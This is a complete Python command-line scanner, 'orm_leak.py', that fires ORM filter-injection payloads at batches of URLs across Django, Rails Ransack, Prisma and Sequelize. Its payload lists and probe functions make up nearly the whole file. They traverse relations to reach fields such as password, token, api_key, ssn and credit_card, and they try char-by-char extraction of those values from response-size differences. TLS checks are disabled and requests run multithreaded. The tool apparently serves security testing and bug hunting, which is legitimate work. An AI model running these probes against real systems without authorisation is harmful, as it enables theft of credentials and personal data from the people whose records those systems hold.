#!/usr/bin/env python3
"""
orm_leak.py — ORM Injection / Leak Scanner
Detects ORM filter injection across Django, Rails Ransack, Prisma, and
Sequelize via differential response analysis, relation traversal, and
char-by-char extraction probes.

Severity mapping:
  P1:ORM_LEAK:CRIT  — sensitive field data extracted (password, token via relation traversal)
  P1:ORM_LEAK:HIGH  — char-by-char extraction confirmed on any field
  P2:ORM_LEAK:HIGH  — ORM operators accepted and modify query results
  P3:ORM_LEAK:MEDIUM — error messages reveal field/model names

Usage:
  python3 orm_leak.py -i urls.txt -o findings.txt -t 10
  python3 orm_leak.py -i urls.txt -o /dev/stdout --dry-run
"""

import argparse
import json
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_UA = "noleak"
DEFAULT_HEADERS = {"Accept": "application/json"}
TIMEOUT = 10

# ── Sensitive fields to probe via relation traversal / direct filter ──
SENSITIVE_FIELDS = [
    "password", "passwd", "secret", "token", "api_key", "apikey",
    "secret_key", "auth_token", "ssn", "credit_card", "hash",
    "salt", "otp", "pin", "private_key",
]

# ── Common relation names for traversal ──
RELATION_NAMES = [
    "user", "account", "admin", "owner", "author", "creator",
    "profile", "credential", "member", "customer",
]

# ── Framework error signatures ──
FRAMEWORK_SIGNATURES = {
    "django": [
        (r"x-powered-by", r"django", "header"),
        (r"csrfmiddlewaretoken", None, "body"),
        (r"FieldError|Cannot resolve keyword|Related Field", None, "error"),
        (r"django\.core|django\.db", None, "error"),
    ],
    "rails": [
        (r"x-powered-by", r"phusion|passenger", "header"),
        (r"x-request-id", r"[0-9a-f-]{36}", "header"),
        (r"x-runtime", r"\d+\.\d+", "header"),
        (r"ActionController|ActiveRecord|ransack", None, "error"),
    ],
    "express": [
        (r"x-powered-by", r"express", "header"),
        (r"SequelizeDatabaseError|Sequelize", None, "error"),
    ],
    "prisma": [
        (r"x-powered-by", r"express|next", "header"),
        (r"PrismaClientValidationError|PrismaClient", None, "error"),
        (r"prisma", None, "error"),
    ],
}

# ── Probe definitions per framework ──

# Django ORM: field__lookup=value
DJANGO_LOOKUPS = [
    ("{param}__startswith", "a", "z", "STARTSWITH"),
    ("{param}__contains", "@", "zzz", "CONTAINS"),
    ("{param}__regex", "^admin", "^zzzzz", "REGEX"),
    ("{param}__gt", "", "zzzzzzz", "GT"),
    ("{param}__lt", "zzzzzzz", "", "LT"),
    ("{param}__isnull", "true", "false", "ISNULL"),
    ("{param}__in", "1,2,3", "999998,999999", "IN"),
]

# Django relation traversal: user__password__startswith=p
DJANGO_RELATION_PROBES = [
    ("{rel}__{field}__startswith", "RELATION_STARTSWITH"),
    ("{rel}__{field}__contains", "RELATION_CONTAINS"),
]

# Rails Ransack: q[param_pred]=value
RANSACK_PROBES = [
    ("q[{param}_cont]", "test", "zxzxzxzx", "CONT"),
    ("q[{param}_start]", "a", "zzzz", "START"),
    ("q[{param}_end]", ".com", ".zxzxzx", "END"),
    ("q[{param}_eq]", "admin", "zxzxzx", "EQ"),
    ("q[s]", "{param}+asc", "{param}+desc", "SORT"),
]

# Ransack sensitive field probes
RANSACK_SENSITIVE = [
    ("q[{field}_cont]", "a", "SENSITIVE_CONT"),
    ("q[{param}_or_{field}_cont]", "a", "OR_INJECTION"),
]

# Ransack complex grouping
RANSACK_COMPLEX = (
    "q[g][0][m]=or&q[g][0][c][0][a][0][name]={field}"
    "&q[g][0][c][0][p]=cont&q[g][0][c][0][v]=a"
)

# Prisma: where[field][op]=value
PRISMA_PROBES = [
    ("where[{param}][contains]", "test", "zxzxzx", "CONTAINS"),
    ("where[{param}][startsWith]", "a", "zzzz", "STARTSWITH"),
    ("where[{param}][endsWith]", ".com", ".zxzxzx", "ENDSWITH"),
    ("where[{param}][not]", "null", "zxzxzx", "NOT"),
    ("orderBy[{param}]", "asc", "desc", "ORDERBY"),
]

# Prisma relation traversal
PRISMA_RELATION_PROBES = [
    ("where[{rel}][is][{field}]", "RELATION_IS"),
    ("where[OR][0][{param}][contains]", "OR_INJECTION"),
]

# Sequelize: param[$op]=value
SEQUELIZE_PROBES = [
    ("{param}[$like]", "%25test%25", "%25zxzxzx%25", "LIKE"),
    ("{param}[$gt]", "", "zzzzzzz", "GT"),
    ("{param}[$ne]", "null", "zxzxzx", "NE"),
    ("{param}[$regexp]", "^admin", "^zxzxzx", "REGEXP"),
]

# Sequelize advanced
SEQUELIZE_ADVANCED = [
    ("{param}[$between][0]", "a", "{param}[$between][1]", "z", "BETWEEN"),
    ("$or[0][{param}]", "test", None, None, "OR_INJECTION"),
]

# Generic ORM probes (framework-agnostic)
GENERIC_PROBES = [
    ("sort", "{param}", "-{param}", "SORT"),
    ("order", "{param}", "-{param}", "ORDER"),
    ("fields", "{param}", "id", "FIELD_SELECT"),
    ("select", "{param}", "id", "SELECT"),
    ("include", "{param}", "id", "INCLUDE"),
    ("populate", "{param}", "id", "POPULATE"),
    ("limit", "-1", "10", "LIMIT_BYPASS"),
    ("limit", "999999", "1", "LIMIT_LARGE"),
    ("filter[{param}]", "a", "zxzxzx", "FILTER"),
]

# ── Field/model name patterns in error messages ──
MODEL_ERROR_PATTERNS = [
    r"(?:field|column|attribute|property)\s+['\"](\w+)['\"]",
    r"(?:Unknown|Invalid|undefined)\s+(?:field|column|attribute)\s+['\"]?(\w+)",
    r"(?:Cannot resolve keyword)\s+['\"](\w+)['\"]",
    r"(?:valid choices are|available fields|choices:)\s*\[([^\]]+)\]",
    r"(?:model|table)\s+['\"](\w+)['\"]",
    r"FieldError.*?Choices are:\s*([\w,\s]+)",
]

EXTRACTION_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"


def build_session(user_agent, timeout):
    """Create a configured requests session."""
    sess = requests.Session()
    sess.headers.update(DEFAULT_HEADERS)
    sess.headers["User-Agent"] = user_agent
    sess.verify = False
    sess.timeout = timeout
    return sess


def safe_get(session, url, timeout=TIMEOUT):
    """GET request returning (status, body_text, content_length, headers)."""
    try:
        resp = session.get(url, allow_redirects=True, timeout=timeout)
        return resp.status_code, resp.text, len(resp.text), resp.headers
    except requests.RequestException:
        return None, "", 0, {}


def parse_json_body(body):
    """Attempt JSON parse, return data or None."""
    try:
        return json.loads(body)
    except (json.JSONDecodeError, ValueError):
        return None


def count_json_items(data):
    """Count items in a JSON response (list or paginated wrapper)."""
    if isinstance(data, list):
        return len(data)
    if isinstance(data, dict):
        for key in ("results", "data", "items", "records", "rows", "entries", "objects"):
            if key in data and isinstance(data[key], list):
                return len(data[key])
    return -1


def extract_field_names(data):
    """Extract field names from first item in JSON response."""
    item = None
    if isinstance(data, list) and data:
        item = data[0]
    elif isinstance(data, dict):
        for key in ("results", "data", "items", "records", "rows"):
            if key in data and isinstance(data[key], list) and data[key]:
                item = data[key][0]
                break
        if item is None:
            item = data
    if isinstance(item, dict):
        return set(item.keys())
    return set()


def detect_framework(session, url, timeout):
    """Detect backend framework from response headers and error probes."""
    status, body, size, headers = safe_get(session, url, timeout)
    if status is None:
        return "unknown", set()

    detected = set()
    headers_lower = {k.lower(): v for k, v in headers.items()}

    for fw, sigs in FRAMEWORK_SIGNATURES.items():
        for header_or_pattern, value_pattern, sig_type in sigs:
            if sig_type == "header":
                hval = headers_lower.get(header_or_pattern, "")
                if value_pattern and re.search(value_pattern, hval, re.I):
                    detected.add(fw)
            elif sig_type == "body" and header_or_pattern in body.lower():
                detected.add(fw)
            elif sig_type == "error" and re.search(header_or_pattern, body, re.I):
                detected.add(fw)

    # Also probe with an invalid filter to trigger framework errors
    error_probes = [
        f"{url.rstrip('/')}?__invalid_lookup__=1",
        f"{url.rstrip('/')}?q[__invalid__]=1",
        f"{url.rstrip('/')}?where[__invalid__][contains]=1",
        f"{url.rstrip('/')}?__invalid__[$ne]=1",
    ]
    for probe_url in error_probes:
        _, err_body, _, _ = safe_get(session, probe_url, timeout)
        if err_body:
            for fw, sigs in FRAMEWORK_SIGNATURES.items():
                for pattern, _, sig_type in sigs:
                    if sig_type == "error" and re.search(pattern, err_body, re.I):
                        detected.add(fw)

    # Extract field names from successful response
    fields = set()
    if status and status < 400:
        data = parse_json_body(body)
        if data:
            fields = extract_field_names(data)

    return detected if detected else {"unknown"}, fields


def inject_query_param(url, key, value):
    """Add or replace a query parameter in a URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[key] = [value]
    flat = {k: v[0] for k, v in params.items()}
    new_query = urlencode(flat)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                       parsed.params, new_query, parsed.fragment))


def inject_raw_params(url, raw_query):
    """Append raw query string to URL."""
    parsed = urlparse(url)
    base = url.split("?")[0] if "?" in url else url
    existing = parsed.query
    if existing:
        return f"{base}?{existing}&{raw_query}"
    return f"{base}?{raw_query}"


def get_url_params(url):
    """Extract parameter names from URL query string."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return list(params.keys())


def is_significant_diff(size_a, size_b, threshold=0.10):
    """Check if two response sizes differ by more than threshold."""
    if size_a == 0 and size_b == 0:
        return False
    if size_a == 0 or size_b == 0:
        return True
    ratio = abs(size_a - size_b) / max(size_a, size_b)
    return ratio > threshold


def extract_model_fields_from_error(body):
    """Extract field/model names from error messages."""
    found = set()
    for pattern in MODEL_ERROR_PATTERNS:
        matches = re.findall(pattern, body, re.I)
        for m in matches:
            if "," in m:
                found.update(f.strip().strip("'\"") for f in m.split(","))
            else:
                found.add(m.strip().strip("'\""))
    return found


def test_django(session, url, params, known_fields, timeout):
    """Test Django ORM filter injection."""
    findings = []

    for param in params:
        # Get baseline
        b_status, b_body, b_size, _ = safe_get(session, url, timeout)
        if b_status is None:
            continue

        for lookup_tpl, val_a, val_b, probe_name in DJANGO_LOOKUPS:
            lookup_key = lookup_tpl.format(param=param)
            url_a = inject_query_param(url, lookup_key, val_a)
            status_a, body_a, size_a, _ = safe_get(session, url_a, timeout)
            if status_a is None:
                continue

            # Check for error-based field disclosure
            if status_a in (400, 422, 500):
                leaked = extract_model_fields_from_error(body_a)
                if leaked:
                    findings.append(
                        f"[P3:ORM_LEAK:MEDIUM] DJANGO_ERROR_FIELDS | {url} | "
                        f"param={param} lookup={probe_name} reveals fields: "
                        f"{', '.join(sorted(leaked))} | status={status_a}"
                    )
                continue

            if status_a != 200:
                continue

            # Differential: compare with val_b
            url_b = inject_query_param(url, lookup_key, val_b)
            status_b, body_b, size_b, _ = safe_get(session, url_b, timeout)
            if status_b != 200:
                continue

            if is_significant_diff(size_a, size_b):
                findings.append(
                    f"[P2:ORM_LEAK:HIGH] DJANGO_{probe_name} | {url} | "
                    f"param={param} operator accepted — differential "
                    f"{size_a}B vs {size_b}B | status={status_a}"
                )

        # Relation traversal for sensitive fields
        for rel in RELATION_NAMES:
            for field in SENSITIVE_FIELDS:
                for tpl, rprobe in DJANGO_RELATION_PROBES:
                    rkey = tpl.format(rel=rel, field=field)
                    url_r = inject_query_param(url, rkey, "a")
                    st_r, bd_r, sz_r, _ = safe_get(session, url_r, timeout)
                    if st_r is None:
                        continue
                    if st_r == 200 and is_significant_diff(b_size, sz_r):
                        findings.append(
                            f"[P1:ORM_LEAK:CRIT] DJANGO_{rprobe} | {url} | "
                            f"{rel}__{field} leaks data via relation traversal "
                            f"(baseline {b_size}B vs {sz_r}B) | status={st_r}"
                        )
                        break
                    if st_r in (400, 422, 500):
                        leaked = extract_model_fields_from_error(bd_r)
                        if leaked:
                            findings.append(
                                f"[P3:ORM_LEAK:MEDIUM] DJANGO_RELATION_ERROR | {url} | "
                                f"{rel}__{field} error reveals fields: "
                                f"{', '.join(sorted(leaked))} | status={st_r}"
                            )
                            break

        # isnull differential
        url_null = inject_query_param(url, f"{param}__isnull", "true")
        url_notnull = inject_query_param(url, f"{param}__isnull", "false")
        st_n, _, sz_n, _ = safe_get(session, url_null, timeout)
        st_nn, _, sz_nn, _ = safe_get(session, url_notnull, timeout)
        if st_n == 200 and st_nn == 200 and is_significant_diff(sz_n, sz_nn):
            findings.append(
                f"[P2:ORM_LEAK:HIGH] DJANGO_ISNULL | {url} | "
                f"param={param} isnull differential {sz_n}B vs {sz_nn}B"
            )

    return findings


def test_ransack(session, url, params, known_fields, timeout):
    """Test Rails Ransack filter injection."""
    findings = []

    b_status, b_body, b_size, _ = safe_get(session, url, timeout)
    if b_status is None:
        return findings

    for param in params:
        for key_tpl, val_a, val_b, probe_name in RANSACK_PROBES:
            qkey = key_tpl.format(param=param)
            url_a = inject_query_param(url, qkey, val_a.format(param=param) if "{param}" in val_a else val_a)
            status_a, body_a, size_a, _ = safe_get(session, url_a, timeout)
            if status_a is None:
                continue

            if status_a in (400, 422, 500):
                leaked = extract_model_fields_from_error(body_a)
                if leaked:
                    findings.append(
                        f"[P3:ORM_LEAK:MEDIUM] RANSACK_ERROR_FIELDS | {url} | "
                        f"param={param} predicate={probe_name} reveals fields: "
                        f"{', '.join(sorted(leaked))} | status={status_a}"
                    )
                continue

            if status_a != 200:
                continue

            url_b = inject_query_param(url, qkey, val_b.format(param=param) if "{param}" in val_b else val_b)
            status_b, _, size_b, _ = safe_get(session, url_b, timeout)
            if status_b != 200:
                continue

            if is_significant_diff(size_a, size_b):
                findings.append(
                    f"[P2:ORM_LEAK:HIGH] RANSACK_{probe_name} | {url} | "
                    f"param={param} predicate accepted — differential "
                    f"{size_a}B vs {size_b}B | status={status_a}"
                )

    # Sensitive field probes (password, token, etc.)
    for field in SENSITIVE_FIELDS:
        for key_tpl, val, sprobe in RANSACK_SENSITIVE:
            qkey = key_tpl.format(field=field, param=params[0] if params else "id")
            url_s = inject_query_param(url, qkey, val)
            st_s, bd_s, sz_s, _ = safe_get(session, url_s, timeout)
            if st_s == 200 and is_significant_diff(b_size, sz_s):
                findings.append(
                    f"[P1:ORM_LEAK:CRIT] RANSACK_{sprobe} | {url} | "
                    f"field={field} accessible via Ransack "
                    f"(baseline {b_size}B vs {sz_s}B) | status={st_s}"
                )
            elif st_s in (400, 422, 500):
                leaked = extract_model_fields_from_error(bd_s)
                if leaked:
                    findings.append(
                        f"[P3:ORM_LEAK:MEDIUM] RANSACK_SENSITIVE_ERROR | {url} | "
                        f"field={field} error reveals: {', '.join(sorted(leaked))}"
                    )

    # Complex grouping probe
    for field in SENSITIVE_FIELDS[:3]:
        raw = RANSACK_COMPLEX.format(field=field)
        url_c = inject_raw_params(url, raw)
        st_c, bd_c, sz_c, _ = safe_get(session, url_c, timeout)
        if st_c == 200 and is_significant_diff(b_size, sz_c):
            findings.append(
                f"[P1:ORM_LEAK:CRIT] RANSACK_COMPLEX_GROUP | {url} | "
                f"field={field} accessible via complex grouping "
                f"(baseline {b_size}B vs {sz_c}B) | status={st_c}"
            )

    return findings


def test_prisma(session, url, params, known_fields, timeout):
    """Test Prisma filter injection."""
    findings = []

    b_status, b_body, b_size, _ = safe_get(session, url, timeout)
    if b_status is None:
        return findings

    for param in params:
        for key_tpl, val_a, val_b, probe_name in PRISMA_PROBES:
            qkey = key_tpl.format(param=param)
            url_a = inject_query_param(url, qkey, val_a)
            status_a, body_a, size_a, _ = safe_get(session, url_a, timeout)
            if status_a is None:
                continue

            if status_a in (400, 422, 500):
                leaked = extract_model_fields_from_error(body_a)
                if leaked:
                    findings.append(
                        f"[P3:ORM_LEAK:MEDIUM] PRISMA_ERROR_FIELDS | {url} | "
                        f"param={param} op={probe_name} reveals fields: "
                        f"{', '.join(sorted(leaked))} | status={status_a}"
                    )
                continue

            if status_a != 200:
                continue

            url_b = inject_query_param(url, qkey, val_b)
            status_b, _, size_b, _ = safe_get(session, url_b, timeout)
            if status_b != 200:
                continue

            if is_significant_diff(size_a, size_b):
                findings.append(
                    f"[P2:ORM_LEAK:HIGH] PRISMA_{probe_name} | {url} | "
                    f"param={param} operator accepted — differential "
                    f"{size_a}B vs {size_b}B | status={status_a}"
                )

    # Prisma relation traversal
    for rel in RELATION_NAMES:
        for field in SENSITIVE_FIELDS:
            for tpl, rprobe in PRISMA_RELATION_PROBES:
                rkey = tpl.format(rel=rel, field=field, param=params[0] if params else "id")
                url_r = inject_query_param(url, rkey, "a")
                st_r, bd_r, sz_r, _ = safe_get(session, url_r, timeout)
                if st_r == 200 and is_significant_diff(b_size, sz_r):
                    findings.append(
                        f"[P1:ORM_LEAK:CRIT] PRISMA_{rprobe} | {url} | "
                        f"{rel}.{field} leaks data via relation traversal "
                        f"(baseline {b_size}B vs {sz_r}B) | status={st_r}"
                    )
                    break

    # OR injection
    if params:
        qkey = f"where[OR][0][{params[0]}][contains]"
        url_or = inject_query_param(url, qkey, "test")
        st_or, _, sz_or, _ = safe_get(session, url_or, timeout)
        if st_or == 200 and is_significant_diff(b_size, sz_or):
            findings.append(
                f"[P2:ORM_LEAK:HIGH] PRISMA_OR_INJECTION | {url} | "
                f"OR condition accepted (baseline {b_size}B vs {sz_or}B)"
            )

    return findings


def test_sequelize(session, url, params, known_fields, timeout):
    """Test Sequelize operator injection."""
    findings = []

    b_status, b_body, b_size, _ = safe_get(session, url, timeout)
    if b_status is None:
        return findings

    for param in params:
        for key_tpl, val_a, val_b, probe_name in SEQUELIZE_PROBES:
            qkey = key_tpl.format(param=param)
            url_a = inject_query_param(url, qkey, val_a)
            status_a, body_a, size_a, _ = safe_get(session, url_a, timeout)
            if status_a is None:
                continue

            if status_a in (400, 422, 500):
                leaked = extract_model_fields_from_error(body_a)
                if leaked:
                    findings.append(
                        f"[P3:ORM_LEAK:MEDIUM] SEQUELIZE_ERROR_FIELDS | {url} | "
                        f"param={param} op={probe_name} reveals fields: "
                        f"{', '.join(sorted(leaked))} | status={status_a}"
                    )
                continue

            if status_a != 200:
                continue

            url_b = inject_query_param(url, qkey, val_b)
            status_b, _, size_b, _ = safe_get(session, url_b, timeout)
            if status_b != 200:
                continue

            if is_significant_diff(size_a, size_b):
                findings.append(
                    f"[P2:ORM_LEAK:HIGH] SEQUELIZE_{probe_name} | {url} | "
                    f"param={param} operator accepted — differential "
                    f"{size_a}B vs {size_b}B | status={status_a}"
                )

        # Sequelize $between and $or
        for key_a_tpl, va, key_b_tpl, vb, adv_name in SEQUELIZE_ADVANCED:
            ka = key_a_tpl.format(param=param)
            raw = f"{ka}={va}"
            if key_b_tpl:
                kb = key_b_tpl.format(param=param)
                raw += f"&{kb}={vb}"
            url_adv = inject_raw_params(url, raw)
            st_adv, bd_adv, sz_adv, _ = safe_get(session, url_adv, timeout)
            if st_adv == 200 and is_significant_diff(b_size, sz_adv):
                findings.append(
                    f"[P2:ORM_LEAK:HIGH] SEQUELIZE_{adv_name} | {url} | "
                    f"param={param} advanced operator accepted "
                    f"(baseline {b_size}B vs {sz_adv}B) | status={st_adv}"
                )

    # $or injection with sensitive fields
    for field in SENSITIVE_FIELDS[:5]:
        url_or = inject_query_param(url, f"$or[0][{field}]", "test")
        st_or, _, sz_or, _ = safe_get(session, url_or, timeout)
        if st_or == 200 and is_significant_diff(b_size, sz_or):
            findings.append(
                f"[P1:ORM_LEAK:CRIT] SEQUELIZE_OR_SENSITIVE | {url} | "
                f"$or injection on {field} accepted "
                f"(baseline {b_size}B vs {sz_or}B) | status={st_or}"
            )

    return findings


def test_generic(session, url, params, known_fields, timeout):
    """Test generic ORM probes (framework-agnostic)."""
    findings = []

    b_status, b_body, b_size, _ = safe_get(session, url, timeout)
    if b_status is None:
        return findings

    # Generic sort/field/filter probes using known params
    test_params = params if params else ["id"]

    for probe_key, val_a_tpl, val_b_tpl, probe_name in GENERIC_PROBES:
        for param in test_params:
            val_a = val_a_tpl.format(param=param) if "{param}" in val_a_tpl else val_a_tpl
            val_b = val_b_tpl.format(param=param) if "{param}" in val_b_tpl else val_b_tpl
            qkey = probe_key.format(param=param) if "{param}" in probe_key else probe_key

            url_a = inject_query_param(url, qkey, val_a)
            status_a, body_a, size_a, _ = safe_get(session, url_a, timeout)
            if status_a is None or status_a != 200:
                continue

            url_b = inject_query_param(url, qkey, val_b)
            status_b, _, size_b, _ = safe_get(session, url_b, timeout)
            if status_b != 200:
                continue

            if is_significant_diff(size_a, size_b):
                findings.append(
                    f"[P2:ORM_LEAK:HIGH] GENERIC_{probe_name} | {url} | "
                    f"param={param} probe={qkey} accepted — differential "
                    f"{size_a}B vs {size_b}B | status={status_a}"
                )
            break  # One param per probe is enough

    # Sensitive field selection
    for field in SENSITIVE_FIELDS[:5]:
        for selector in ("fields", "select", "include", "populate"):
            url_f = inject_query_param(url, selector, field)
            st_f, bd_f, sz_f, _ = safe_get(session, url_f, timeout)
            if st_f == 200 and sz_f > 0 and is_significant_diff(b_size, sz_f):
                data = parse_json_body(bd_f)
                if data and field in str(data):
                    findings.append(
                        f"[P1:ORM_LEAK:CRIT] GENERIC_FIELD_SELECT | {url} | "
                        f"?{selector}={field} exposes sensitive field "
                        f"({sz_f}B) | status={st_f}"
                    )

    # Sort by sensitive fields
    for field in SENSITIVE_FIELDS[:5]:
        for sort_key in ("sort", "order", "ordering"):
            url_s = inject_query_param(url, sort_key, field)
            st_s, _, sz_s, _ = safe_get(session, url_s, timeout)
            if st_s == 200 and is_significant_diff(b_size, sz_s):
                findings.append(
                    f"[P2:ORM_LEAK:HIGH] GENERIC_SORT_SENSITIVE | {url} | "
                    f"?{sort_key}={field} accepted — response changed "
                    f"(baseline {b_size}B vs {sz_s}B) | status={st_s}"
                )
                break

    # Pagination bypass
    url_neg = inject_query_param(url, "limit", "-1")
    st_neg, _, sz_neg, _ = safe_get(session, url_neg, timeout)
    if st_neg == 200 and sz_neg > b_size * 2:
        findings.append(
            f"[P2:ORM_LEAK:HIGH] GENERIC_LIMIT_BYPASS | {url} | "
            f"limit=-1 returns excess data "
            f"(baseline {b_size}B vs {sz_neg}B) | status={st_neg}"
        )

    return findings


def test_char_extraction(session, url, param, framework, timeout):
    """Attempt char-by-char extraction to confirm data leak severity."""
    findings = []

    # Build startswith probe based on framework
    if framework == "django":
        key_tpl = f"{param}__startswith"
    elif framework == "rails":
        key_tpl = f"q[{param}_start]"
    elif framework == "prisma":
        key_tpl = f"where[{param}][startsWith]"
    elif framework == "sequelize":
        key_tpl = f"{param}[$like]"
    else:
        return findings

    # Test first 3 chars to confirm differential extraction works
    extracted = ""
    for pos in range(3):
        sizes = {}
        for ch in "aeimrst0159":  # Subset for speed
            if framework == "sequelize":
                val = f"{extracted}{ch}%25"
            else:
                val = f"{extracted}{ch}"
            test_url = inject_query_param(url, key_tpl, val)
            st, _, sz, _ = safe_get(session, test_url, timeout)
            if st == 200:
                sizes[ch] = sz

        if not sizes:
            break

        unique_sizes = set(sizes.values())
        if len(unique_sizes) > 1:
            # Different chars produce different response sizes = extraction works
            if pos == 0:
                findings.append(
                    f"[P1:ORM_LEAK:HIGH] CHAR_EXTRACTION | {url} | "
                    f"param={param} framework={framework} — char-by-char "
                    f"extraction confirmed (differential responses per char) | "
                    f"size_variance={max(sizes.values()) - min(sizes.values())}B"
                )
            # Pick char with most unique size for continuation
            extracted += max(sizes, key=lambda c: sizes[c])
        else:
            break

    return findings


def scan_url(session, url, timeout):
    """Full ORM injection scan on a single URL."""
    all_findings = []

    # Detect framework
    frameworks, known_fields = detect_framework(session, url, timeout)
    params = get_url_params(url)

    # Use known field names as additional params to test
    effective_params = list(set(params) | (known_fields & {
        "id", "name", "email", "username", "status", "type", "role",
    }))
    if not effective_params:
        effective_params = ["id", "name", "email"]

    # Route to framework-specific tests
    if "unknown" in frameworks:
        # Test all frameworks
        all_findings.extend(test_django(session, url, effective_params, known_fields, timeout))
        all_findings.extend(test_ransack(session, url, effective_params, known_fields, timeout))
        all_findings.extend(test_prisma(session, url, effective_params, known_fields, timeout))
        all_findings.extend(test_sequelize(session, url, effective_params, known_fields, timeout))
    else:
        if "django" in frameworks:
            all_findings.extend(test_django(session, url, effective_params, known_fields, timeout))
        if "rails" in frameworks:
            all_findings.extend(test_ransack(session, url, effective_params, known_fields, timeout))
        if "express" in frameworks:
            all_findings.extend(test_sequelize(session, url, effective_params, known_fields, timeout))
        if "prisma" in frameworks:
            all_findings.extend(test_prisma(session, url, effective_params, known_fields, timeout))

    # Always run generic probes
    all_findings.extend(test_generic(session, url, effective_params, known_fields, timeout))

    # If any P2+ finding, attempt char-by-char extraction for severity upgrade
    if any("[P2:" in f or "[P1:" in f for f in all_findings):
        for param in effective_params[:2]:
            fw = "django" if "django" in frameworks else \
                 "rails" if "rails" in frameworks else \
                 "prisma" if "prisma" in frameworks else \
                 "sequelize" if "express" in frameworks else "django"
            all_findings.extend(
                test_char_extraction(session, url, param, fw, timeout)
            )

    return all_findings


def main():
    parser = argparse.ArgumentParser(
        description="ORM Injection / Leak Scanner"
    )
    parser.add_argument("-i", "--input", required=True,
                        help="Input file with URLs")
    parser.add_argument("-o", "--output", required=False,
                        help="Output file for findings")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Thread count (default: 10)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("--max-urls", type=int, default=2000,
                        help="Max URLs to test (default: 2000)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show targets without testing")
    parser.add_argument("--user-agent", default=DEFAULT_UA,
                        help="User-Agent string (default: noleak)")
    args = parser.parse_args()

    global TIMEOUT
    TIMEOUT = args.timeout

    try:
        with open(args.input, "r") as f:
            raw_urls = [line.strip() for line in f
                        if line.strip() and line.strip().startswith("http")]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not raw_urls:
        print("[*] No URLs to test")
        return

    # Filter out static assets
    skip_ext = re.compile(
        r"\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|"
        r"pdf|zip|tar|gz|mp4|mp3|webp|avif)(\?|$)", re.I
    )
    urls = [u for u in raw_urls if not skip_ext.search(u)]

    # Deduplicate by netloc+path (keep first occurrence with params)
    seen = set()
    deduped = []
    for url in urls:
        p = urlparse(url)
        key = f"{p.netloc}{p.path}"
        if key not in seen:
            seen.add(key)
            deduped.append(url)
    urls = deduped[:args.max_urls]

    print(f"[*] Loaded {len(raw_urls)} raw URLs, filtered to {len(urls)} endpoints")

    if args.dry_run:
        for url in urls:
            print(f"[DRY-RUN] {url}")
        return

    session = build_session(args.user_agent, args.timeout)
    lock = threading.Lock()
    completed = [0]
    all_findings = []

    def process_url(url):
        findings = scan_url(session, url, args.timeout)
        with lock:
            completed[0] += 1
            if completed[0] % 10 == 0 or findings:
                print(f"[*] Progress: {completed[0]}/{len(urls)} endpoints tested")
            for f in findings:
                print(f"  {f}")
                all_findings.append(f)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_url, url): url for url in urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future]}: {e}")

    if args.output:
        try:
            with open(args.output, "w") as f:
                for line in all_findings:
                    f.write(line + "\n")
            print(f"\n[*] Wrote {len(all_findings)} finding(s) to {args.output}")
        except (IOError, PermissionError) as e:
            print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    print(f"\n[*] Scan complete: {len(urls)} endpoints, {len(all_findings)} findings")


if __name__ == "__main__":
    main()
